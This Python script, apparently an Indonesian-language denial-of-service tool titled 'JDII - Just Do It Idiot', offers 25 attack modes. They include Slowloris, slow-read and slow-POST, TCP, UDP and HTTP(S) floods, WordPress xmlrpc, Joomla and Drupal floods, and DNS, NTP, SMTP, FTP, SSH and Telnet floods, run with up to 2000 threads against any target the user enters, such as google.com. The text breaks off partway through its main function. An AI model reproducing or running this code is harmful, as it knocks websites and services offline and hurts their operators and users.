#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ========== WARNA ==========
MERAH = '\033[91m'
HIJAU = '\033[92m'
KUNING = '\033[93m'
BIRU = '\033[94m'
UNGU = '\033[95m'
CYAN = '\033[96m'
PUTIH = '\033[97m'
TEBAL = '\033[1m'
KEDIP = '\033[5m'
RESET = '\033[0m'

b = fr"""
{MERAH}{TEBAL}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║        █████ ██████████   █████ █████            █████   █████   █████████   ║
║       ▒▒███ ▒▒███▒▒▒▒███ ▒▒███ ▒▒███            ▒▒███   ▒▒███   ███▒▒▒▒▒███  ║
║        ▒███  ▒███   ▒▒███ ▒███  ▒███             ▒███    ▒███  ███     ▒▒▒   ║
║        ▒███  ▒███    ▒███ ▒███  ▒███  ██████████ ▒███████████ ▒███           ║
║        ▒███  ▒███    ▒███ ▒███  ▒███ ▒▒▒▒▒▒▒▒▒▒  ▒███▒▒▒▒▒███ ▒███           ║
║  ███   ▒███  ▒███    ███  ▒███  ▒███             ▒███    ▒███ ▒▒███     ███  ║
║ ▒▒████████   ██████████   █████ █████            █████   █████ ▒▒█████████   ║
║  ▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒            ▒▒▒▒▒   ▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RESET}{HIJAU}

                     INTERACTIVE EDITION - NO ROOT
                     Created by: YKAZZZ
                     Version: BETA
"""

import json
import os
import sys
import socket
import threading
import time
import random
import ssl
import ipaddress
import getpass
from datetime import datetime, timedelta
from login_system import login_register_loop

os.system("clear")
print(b)

# ========== SLOW PRINT ==========
def slow_print(text, delay=0.0001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ========== BANNER ==========
def show_banner():
    banner = f"""
{MERAH}{TEBAL}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║        █████ ██████████   █████ █████            █████   █████   █████████   ║
║       ▒▒███ ▒▒███▒▒▒▒███ ▒▒███ ▒▒███            ▒▒███   ▒▒███   ███▒▒▒▒▒███  ║
║        ▒███  ▒███   ▒▒███ ▒███  ▒███             ▒███    ▒███  ███     ▒▒▒   ║
║        ▒███  ▒███    ▒███ ▒███  ▒███  ██████████ ▒███████████ ▒███           ║
║        ▒███  ▒███    ▒███ ▒███  ▒███ ▒▒▒▒▒▒▒▒▒▒  ▒███▒▒▒▒▒███ ▒███           ║
║  ███   ▒███  ▒███    ███  ▒███  ▒███             ▒███    ▒███ ▒▒███     ███  ║
║ ▒▒████████   ██████████   █████ █████            █████   █████ ▒▒█████████   ║
║  ▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒            ▒▒▒▒▒   ▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒    ║
║                   							       ║
║                JUST DO IT IDIOT HARDCORE - NO ROOT                           ║
║                    Version BETA | YKAZZZ                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)

# ========== USER-AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# ========== MODE DESKRIPSI ==========
MODES = {
    # Low & Slow
    '1': {'name': 'slowloris', 'desc': '🐢 Slowloris - Ninja Mode', 'cat': 'Low & Slow'},
    '2': {'name': 'slowread', 'desc': '🦥 Slowread - RAM Eater', 'cat': 'Low & Slow'},
    '3': {'name': 'slowpost', 'desc': '🐌 Slowpost - Connection Killer', 'cat': 'Low & Slow'},
    '4': {'name': '404', 'desc': '🦟 404 Flood - Log Flooder', 'cat': 'Low & Slow'},
    # Protocol
    '5': {'name': 'tcpflood', 'desc': '📡 TCP Flood', 'cat': 'Protocol'},
    '6': {'name': 'udpflood', 'desc': '📦 UDP Flood', 'cat': 'Protocol'},
    # Web
    '7': {'name': 'httpflood', 'desc': '🌐 HTTP Flood', 'cat': 'Web'},
    '8': {'name': 'httpsflood', 'desc': '🔒 HTTPS Flood', 'cat': 'Web'},
    '9': {'name': 'getflood', 'desc': '📤 GET Flood', 'cat': 'Web'},
    '10': {'name': 'postflood', 'desc': '📥 POST Flood', 'cat': 'Web'},
    '11': {'name': 'headflood', 'desc': '📋 HEAD Flood', 'cat': 'Web'},
    # CMS
    '12': {'name': 'wpflood', 'desc': '📰 WordPress Flood', 'cat': 'CMS'},
    '13': {'name': 'joomlaflood', 'desc': '📋 Joomla Flood', 'cat': 'CMS'},
    '14': {'name': 'drupalflood', 'desc': '📁 Drupal Flood', 'cat': 'CMS'},
    '15': {'name': 'phpflood', 'desc': '🐘 PHP Flood', 'cat': 'CMS'},
    # App Layer
    '16': {'name': 'dnsflood', 'desc': '🌍 DNS Flood', 'cat': 'Application'},
    '17': {'name': 'ntpflood', 'desc': '⏰ NTP Flood', 'cat': 'Application'},
    '18': {'name': 'smtpflood', 'desc': '📧 SMTP Flood', 'cat': 'Application'},
    '19': {'name': 'ftpflood', 'desc': '📁 FTP Flood', 'cat': 'Application'},
    '20': {'name': 'sshflood', 'desc': '🔑 SSH Flood', 'cat': 'Application'},
    '21': {'name': 'telnetflood', 'desc': '💻 Telnet Flood', 'cat': 'Application'},
    # Special
    '22': {'name': 'random', 'desc': '🎲 Random Mode - Pilih mode acak', 'cat': 'SPECIAL'},
    '23': {'name': 'chaos', 'desc': '🌪️ Chaos Mode - Ganti mode tiap 30 detik', 'cat': 'SPECIAL'},
    '24': {'name': 'combo', 'desc': '⚡ Combo Mode - Kombinasi 3 mode sekaligus', 'cat': 'SPECIAL'},
    '25': {'name': 'idiot', 'desc': '🤪 Idiot Mode - Jalanin SEMUA mode bergantian', 'cat': 'SPECIAL'},
}

# ========== ATTACK CLASSES ==========
class RTAAttacks:
    @staticmethod
    def slowloris(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n".encode())
            return s
        except:
            return None
    
    @staticmethod
    def slowread(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            files = ['/index.html', '/style.css', '/script.js', '/file_besar.dat']
            s.send(f"GET {random.choice(files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
            return s
        except:
            return None
    
    @staticmethod
    def slowpost(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            content_length = random.randint(100000, 500000)
            s.send(f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {content_length}\r\n\r\n".encode())
            s.send(b"data=")
            return s
        except:
            return None
    
    @staticmethod
    def fourzerofour(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            names = ['bebek', 'ayam', 'kucing', 'ikan', 'burung', 'sapi']
            exts = ['.dat', '.jpg', '.png', '.zip', '.rar']
            fake_file = f"/{random.choice(names)}_{random.randint(1000,9999)}{random.choice(exts)}"
            s.send(f"GET {fake_file} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
            return s
        except:
            return None
    
    @staticmethod
    def maintain(s, mode):
        try:
            if mode == 'slowloris':
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,9999)}\r\n".encode())
            elif mode in ['slowread', '404']:
                s.recv(1)
            elif mode == 'slowpost':
                s.send(b"x")
            return True
        except:
            return False

class YHCAttacks:
    @staticmethod
    def tcpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def udpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(random.randint(64, 1024))
            s.sendto(data, (target, port))
            return 1
        except:
            return 0

class WebAttacks:
    @staticmethod
    def httpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            paths = ['/', '/index.html', '/about', '/contact', '/products']
            request = f"GET {random.choice(paths)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def httpsflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, True)
    
    @staticmethod
    def getflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, use_ssl)
    
    @staticmethod
    def postflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            data = f"data={random.randint(1000,9999)}&submit=1"
            request = f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}\r\n\r\n{data}"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def headflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            request = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

class CMSAttacks:
    @staticmethod
    def wpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            request = f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: text/xml\r\nContent-Length: {len(xml)}\r\n\r\n{xml}"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def joomlaflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            options = ['com_users', 'com_content', 'com_admin', 'com_cache']
            request = f"GET /index.php?option={random.choice(options)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def drupalflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            nodes = [f"node/{random.randint(1,1000)}", f"user/{random.randint(1,100)}"]
            request = f"GET /{random.choice(nodes)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def phpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            php_files = ['index.php', 'config.php', 'wp-config.php', 'login.php', 'admin.php']
            request = f"GET /{random.choice(php_files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

class AppLayerAttacks:
    @staticmethod
    def dnsflood(target, port=53, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            domains = ['google.com', 'facebook.com', 'youtube.com', 'yahoo.com', 'amazon.com']
            domain = random.choice(domains)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            qname = b''
            for part in domain.split('.'):
                qname += bytes([len(part)]) + part.encode()
            qname += b'\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            query = transaction_id + flags + questions + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + qname + qtype + qclass
            s.sendto(query, (target, port))
            return 1
        except:
            return 0
    
    @staticmethod
    def ntpflood(target, port=123, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            payload = b'\x1b' + 47 * b'\0'
            s.sendto(payload, (target, port))
            return 1
        except:
            return 0
    
    @staticmethod
    def smtpflood(target, port=25, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = [
                "HELO example.com\r\n",
                "MAIL FROM: <test@example.com>\r\n",
                "RCPT TO: <target@example.com>\r\n",
                "QUIT\r\n"
            ]
            for cmd in commands[:random.randint(1,3)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def ftpflood(target, port=21, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = [
                "USER anonymous\r\n",
                "PASS anonymous@\r\n",
                "QUIT\r\n"
            ]
            for cmd in commands[:random.randint(1,2)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def sshflood(target, port=22, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            ssh_versions = ["SSH-2.0-OpenSSH_8.2\r\n", "SSH-2.0-OpenSSH_7.9\r\n"]
            s.send(random.choice(ssh_versions).encode())
            try:
                s.recv(1024)
            except:
                pass
            s.close()
            return 1
        except:
            return 0
    
    @staticmethod
    def telnetflood(target, port=23, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.send(b'\xff\xfd\x22')
            try:
                s.recv(1024)
            except:
                pass
            s.close()
            return 1
        except:
            return 0

# ========== ATTACK THREAD ==========
class AttackThread(threading.Thread):
    def __init__(self, tid, target, port, mode, duration, rate_limit=0, use_ssl=False):
        threading.Thread.__init__(self)
        self.tid = tid
        self.target = target
        self.port = port
        self.mode = mode
        self.duration = duration
        self.rate_limit = rate_limit
        self.use_ssl = use_ssl
        self.running = True
        self.requests_sent = 0
        self.daemon = True
        self.sockets = []
        
        # attack menu pick
        if mode in ['slowloris', 'slowread', 'slowpost', '404']:
            self.attack_class = RTAAttacks
            self.is_slow = True
        elif mode in ['tcpflood', 'udpflood']:
            self.attack_class = YHCAttacks
            self.is_slow = False
        elif mode in ['httpflood', 'httpsflood', 'getflood', 'postflood', 'headflood']:
            self.attack_class = WebAttacks
            self.is_slow = False
        elif mode in ['wpflood', 'joomlaflood', 'drupalflood', 'phpflood']:
            self.attack_class = CMSAttacks
            self.is_slow = False
        else:
            self.attack_class = AppLayerAttacks
            self.is_slow = False
    
    def run(self):
        start_time = time.time()
        last_request = 0
        
        while self.running and (time.time() - start_time < self.duration):
            try:
                if self.rate_limit > 0:
                    now = time.time()
                    if now - last_request < (1.0 / self.rate_limit):
                        time.sleep(0.001)
                        continue
                    last_request = now
                
                if self.is_slow:
                    s = getattr(self.attack_class, self.mode)(self.target, self.port, self.use_ssl)
                    if s:
                        self.sockets.append(s)
                        self.requests_sent += 1
                        for _ in range(random.randint(3, 8)):
                            if not self.running:
                                break
                            if not getattr(self.attack_class, 'maintain')(s, self.mode):
                                break
                            time.sleep(random.uniform(5, 10))
                else:
                    result = getattr(self.attack_class, self.mode)(self.target, self.port, self.use_ssl)
                    if result:
                        self.requests_sent += 1
                
                time.sleep(random.uniform(0.01, 0.05))
                
            except Exception:
                pass
    
    def stop(self):
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass

# ========== INPUT VALIDATION  ==========
def validate_target(target):
    """Validasi IP atau domain"""
    try:
        # valid IP check
        ipaddress.ip_address(target)
        return True
    except:
        # valid domain check
        try:
            socket.gethostbyname(target)
            return True
        except:
            return False

def validate_port(port):
    """Validation port"""
    try:
        port = int(port)
        return 1 <= port <= 65535
    except:
        return False

def validate_threads(threads):
    """Validation thread"""
    try:
        threads = int(threads)
        return 1 <= threads <= 2000
    except:
        return False

def validate_duration(duration):
    """Validation durasi"""
    try:
        duration = int(duration)
        return duration >= 1
    except:
        return False

def validate_rate(rate):
    """Validation rate limit"""
    try:
        rate = int(rate)
        return 0 <= rate <= 10000
    except:
        return False

# ========== MENU INPUT ==========
def input_target():
    """Input target"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                      INPUT TARGET                        ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}example:{RESET} localhost, 192.168.1.1, google.com, 8.8.8.8    {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        target = input(f"\n{HIJAU}[?] Target {RESET}➜ ").strip()
        if not target:
            print(f"{MERAH}[!] Target cannot be empty!{RESET}")
            continue
        if validate_target(target):
            # Resolve domain ke IP
            if not target.replace('.', '').isdigit():
                try:
                    ip = socket.gethostbyname(target)
                    print(f"{HIJAU}[✓] {target} → {ip}{RESET}")
                    return ip
                except:
                    print(f"{MERAH}[!] failed resolve domain{RESET}")
                    continue
            return target
        else:
            print(f"{MERAH}[!] Target not valid!{RESET}")

def input_port():
    """Input port"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                       INPUT PORT                         ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Example:{RESET} 80 (HTTP), 443 (HTTPS), 8080, 21, 22, 53      {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        port = input(f"\n{HIJAU}[?] Port {RESET}➜ ").strip()
        if validate_port(port):
            return int(port)
        else:
            print(f"{MERAH}[!] Port must be a number 1-65535!{RESET}")

def show_mode_menu():
    """menu mode"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                            PICK ATTACK MODE                                  ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
    
    # Group by category
    categories = {}
    for key, mode in MODES.items():
        cat = mode['cat']
        if cat not in categories:
            categories[cat] = []
        categories[cat].append((key, mode))
    
    for cat, modes_list in categories.items():
        print(f"{CYAN}║{RESET} {UNGU}{TEBAL}┌─ {cat} ─{RESET}")
        for key, mode in modes_list:
            print(f"{CYAN}║{RESET} │ {HIJAU}{key}{RESET}. {mode['desc']}")
        print(f"{CYAN}║{RESET}")
    
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")

def input_mode():
    """Input mode attact"""
    show_mode_menu()
    
    while True:
        choice = input(f"\n{HIJAU}[?] Pilih mode (1-25) {RESET}➜ ").strip()
        if choice in MODES:
            mode_info = MODES[choice]
            print(f"{HIJAU}[✓] Mode: {mode_info['desc']}{RESET}")
            return mode_info['name']
        else:
            print(f"{MERAH}[!] Pilih nomor 1-25!{RESET}")

def input_threads():
    """Input thread"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                         THREAD                           ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Information:{RESET} more = stronger")
    print(f"{CYAN}║{RESET} {KUNING}Rekomended:{RESET} 50-200 for general connection")
    print(f"{CYAN}║{RESET} {KUNING}Max:{RESET} 2000 thread")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        threads = input(f"\n{HIJAU}[?] amount thread (default 50) {RESET}➜ ").strip()
        if not threads:
            return 50
        if validate_threads(threads):
            return int(threads)
        else:
            print(f"{MERAH}[!] Thread must be a number 1-2000!{RESET}")

def input_duration():
    """Input duration attack"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                    ATTACK DURATION                       ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Information:{RESET} in second")
    print(f"{CYAN}║{RESET} {KUNING}Rekomended:{RESET} 60-300 second for testing")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        duration = input(f"\n{HIJAU}[?] Duration (second, default 60) {RESET}➜ ").strip()
        if not duration:
            return 60
        if validate_duration(duration):
            return int(duration)
        else:
            print(f"{MERAH}[!] Duration must be a positive number!{RESET}")

def input_rate():
    """Input rate limit"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                    RATE LIMIT                            ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Information:{RESET} Request per second per thread")
    print(f"{CYAN}║{RESET} {KUNING}Rekomended:{RESET} 10-50 for stable connection")
    print(f"{CYAN}║{RESET} {KUNING}0 = Unlimited{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        rate = input(f"\n{HIJAU}[?] Rate limit (default 10) {RESET}➜ ").strip()
        if not rate:
            return 10
        if validate_rate(rate):
            return int(rate)
        else:
            print(f"{MERAH}[!] Rate harus angka 0-10000!{RESET}")

def input_ssl():
    """Input SSL option"""
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                    HTTPS/SSL?                            ║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
    
    while True:
        ssl_choice = input(f"\n{HIJAU}[?] Using HTTPS/SSL? (y/n, default n) {RESET}➜ ").strip().lower()
        if not ssl_choice or ssl_choice == 'n':
            return False
        if ssl_choice == 'y':
            return True
        print(f"{MERAH}[!] input y or n!{RESET}")

# ========== MAIN FUNCTION ==========
def main():
    clear_screen()
    show_banner()
    
    print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
    print(f"{HIJAU}{TEBAL}                    JDII - JUST DO IT IDIOT - INTERACTIVE EDITION{RESET}")
    print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
    
    # Input data
    target = input_target()
    port = input_port()
    mode = input_mode()
    threads = input_threads()
    duration = input_duration()
    rate = input_rate()
    use_ssl = input_ssl()
    
    # summary
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                                    SUMMARY                                   ║{RESET}")
    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Target    {RESET}➜ {HIJAU}{target}:{port}{RESET}                                                 {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Mode      {RESET}➜ {HIJAU}{mode}{RESET}                                                    {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Threads   {RESET}➜ {HIJAU}{threads}{RESET}                                                    {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Duration  {RESET}➜ {HIJAU}{duration} detik{RESET}                                                {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}Rate      {RESET}➜ {HIJAU}{rate if rate > 0 else 'Unlimited'}{RESET}                                                {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {KUNING}SSL       {RESET}➜ {HIJAU}{'Ya' if use_ssl else 'Tidak'}{RESET}                                                   {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")
    
    # confirm
    print(f"\n{MERAH}{KEDIP}Attack now?{RESET}")
    confirm = input(f"\n{MERAH}[?] Attack? (y/n) {RESET}➜ ").strip().lower()
    
    if confirm != 'y':
        print(f"\n{KUNING}[!] canceled{RESET}")
        sys.exit(0)
    
    # Handle special modes
    modes_to_run = []
    
    if mode == 'random':
        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
        mode = random.choice(all_modes)
        print(f"\n{KUNING}🎲 Random Mode: {mode}{RESET}")
        modes_to_run = [mode]
    
    elif mode == 'chaos':
        print(f"\n{KUNING}🌪️ CHAOS MODE ACTIVE! auto change mode every 30 second{RESET}")
        modes_to_run = ['chaos']
    
    elif mode == 'combo':
        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
        combo_modes = random.sample(all_modes, 3)
        print(f"\n{UNGU}⚡ COMBO MODE ACTIVE!{RESET}")
        for m in combo_modes:
            print(f"    • {m}")
        modes_to_run = combo_modes
    
    elif mode == 'idiot':
        print(f"\n{MERAH}🤪 IDIOT MODE ACTIVE! All mode running alternate{RESET}")
        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
        modes_to_run = all_modes.copy()
        random.shuffle(modes_to_run)
    
    else:
        modes_to_run = [mode]
    
    # Start attack
    print(f"\n{HIJAU}[+] Release {threads} thread JDII...{RESET}")
    
    all_threads = []
    
    # crate threads every mode
    for mode_to_run in modes_to_run:
        mode_threads = max(1, threads // len(modes_to_run))
        for i in range(mode_threads):
            t = AttackThread(i, target, port, mode_to_run, duration, rate, use_ssl)
            t.start()
            all_threads.append(t)
            time.sleep(0.01)
    
    # Monitoring
    start_time = time.time()
    last_chaos_time = start_time
    
    try:
        while time.time() - start_time < duration:
            time.sleep(2)
            total_req = sum(t.requests_sent for t in all_threads)
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            # Chaos mode - change mode every 30s
            if mode == 'chaos' and time.time() - last_chaos_time >= 30:
                new_mode = random.choice([m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL'])
                print(f"\n{KUNING}🔄 Chaos mode change to: {new_mode}{RESET}")
                for i in range(threads // 5):
                    t = AttackThread(i+1000, target, port, new_mode, duration - elapsed, rate, use_ssl)
                    t.start()
                    all_threads.append(t)
                last_chaos_time = time.time()
            
            # count rate
            req_rate = total_req / elapsed if elapsed > 0 else 0
            
            # Progress bar
            bar_length = 30
            filled = int(bar_length * elapsed / duration)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            # Mode description
            if mode == 'chaos':
                current_mode = "CHAOS"
            elif len(modes_to_run) > 1:
                current_mode = f"COMBO({len(modes_to_run)})"
            else:
